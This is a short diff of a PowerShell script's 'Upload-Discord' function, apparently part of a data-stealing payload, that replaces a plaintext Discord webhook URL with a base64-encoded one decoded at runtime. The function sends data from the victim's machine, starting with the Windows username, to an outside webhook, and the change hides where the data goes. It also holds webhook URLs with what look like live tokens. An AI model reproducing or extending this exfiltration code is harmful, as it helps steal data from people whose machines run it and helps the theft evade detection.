@@ -1,5 +1,4 @@
 
-
 function Upload-Discord {
 
 	[CmdletBinding()]
@@ -10,7 +9,7 @@ function Upload-Discord {
 		[string]$text 
 	)
 
-	$hookurl = 'https://discord.com/api/webhooks/1088863343105818704/USC0ZiN1ex40ibzX7fSQxf0K8blPcrt3blLKx_AdP-eCcxA1sRGND-KTL9G621Hrx71a'
+	$hookurl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5MjA0MjI2NzIzOTM5NTM5OC9EN2JDMkFuRFVfajYybU1EOEVGUENsSmtrMTdPV0w4ZnNqMW5JdkRHckJOWjJfTUZuQlZkQ2ZLRjRkS1Zac2tTU0dMUg=="))
 
 	$Body = @{
 	  'username' = $env:username
